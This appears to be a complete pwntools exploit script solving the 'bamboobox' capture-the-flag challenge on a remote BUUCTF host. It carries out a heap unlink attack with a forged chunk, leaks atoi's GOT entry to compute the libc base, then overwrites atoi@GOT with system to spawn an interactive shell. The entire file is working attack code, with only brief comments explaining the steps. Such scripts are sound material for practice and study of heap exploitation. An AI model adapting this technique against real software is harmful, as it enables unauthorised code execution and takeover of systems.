from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('../bamboobox')
libc = ELF('../libc-2.23.so')
# target = process(elf.path)
target = remote('node4.buuoj.cn', 29726)


def create(size, content):
    target.sendlineafter('Your choice:', '2')
    target.sendlineafter('name:', str(size))
    target.sendafter('item:', content)


def delete(index):
    target.sendlineafter('Your choice:', '4')
    target.sendlineafter('item:', str(index))
    target.recvuntil('successful!!')


def edit(index, size, content):
    # We can only send limited bytes of new description to the booklist because
    # it will keep track of the allocated size.
    target.sendlineafter('Your choice:', '3')
    target.sendlineafter('item:', str(index))
    target.sendlineafter('name:', str(size))
    target.sendafter('item:', content)


def printf():
    target.sendlineafter('Your choice:', '1')


get_flag = elf.sym['magic']
atoi_got = elf.got['atoi']

# Overflow the heap! You can't because the string is forced to be truncated...
# Another approach would be unlink.

heaparray = 0x6020C8

create(0x40, b'a')
create(0x80, b'a')
create(0x80, b'/bin/sh\x00')

fd = heaparray - 0x18
bk = heaparray - 0x10

fake_chunk = p64(0x0) + p64(0x41) + p64(fd) + p64(bk) + b'a' * 0x20
fake_chunk += p64(0x40) + p64(0x90)
edit(0, 0x80, fake_chunk)
# Now heaparray[0] = &heaparray - 0x18 
# => Thus we can leak the content of atoi_got.
delete(1)

payload = p64(0x0) * 3 + p64(atoi_got)
edit(0, len(payload), payload)

printf()
atoi_addr = u64(target.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc.address = atoi_addr - libc.sym['atoi']
system = libc.sym['system']
edit(0, 0x8, p64(system))

target.interactive()
